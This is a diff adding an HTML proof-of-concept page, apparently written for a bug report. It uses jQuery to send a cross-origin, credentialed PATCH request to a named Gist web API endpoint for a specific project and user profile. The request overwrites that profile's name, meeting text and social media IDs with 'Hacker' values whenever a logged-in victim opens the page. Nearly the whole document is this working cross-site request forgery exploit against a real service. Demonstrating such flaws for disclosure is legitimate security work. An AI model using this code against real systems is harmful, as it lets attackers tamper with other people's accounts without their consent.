@@ -1,0 +1,27 @@
+<html>
+<script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+<body>
+<p id='success'></p>
+<p id='error'></p>
+<script>
+$.ajax({
+    //type: 'POST',
+	type: 'PATCH',
+	/* beforeSend: function(request) {
+    request.setRequestHeader("Authority", authorizationToken);
+	} */
+	contentType: 'application/json',
+	url: "https://web-api.getgist.com/api/v1/web/projects/tumi3b4l/settings/users_profiles/95",
+    crossDomain: true,
+	data: '{"meeting_cta_text": "Hacked", "full_name": "Hacker", "social_media":[{"in-id":"HackerInstagram", "pi-id":"HackerTwitter","ln-id":"HackerLinkedin", "pn-id": "HackerPinterest", "fb-id": "HackerFacebook"}]}', 
+	xhrFields: { withCredentials: true },		
+    success: function(responseData, textStatus, jqXHR) {
+          document.getElementById("success").innerHTML = "PLEASE RELOAD THE PROFILE PAGE OF THE GIST SITE NOW";
+    },
+    error: function (responseData, textStatus, errorThrown) {
+       document.getElementById("success").innerHTML = "PLEASE RELOAD THE PROFILE PAGE OF THE GIST SITE NOW";
+    }
+});
+</script>
+</body>
+</html>
